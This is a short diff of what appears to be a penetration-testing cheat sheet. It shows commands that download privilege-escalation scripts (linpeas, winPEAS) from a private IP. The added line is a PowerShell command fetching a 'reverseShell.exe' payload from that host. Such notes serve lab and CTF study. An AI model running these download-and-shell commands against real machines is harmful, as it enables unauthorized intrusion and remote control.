@@ -301,6 +301,8 @@ curl 10.4.9.144:8000/linpeas.sh > linpeas.sh
 on windows machine
 ```
 powershell -c wget "http://10.4.9.144:8080/winPEAS.exe" -outfile "winPEAS.exe"
+
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.4.9.144:8000/reverseShell.exe','reverseShell.exe')"
 ```
 
 ## download files from box
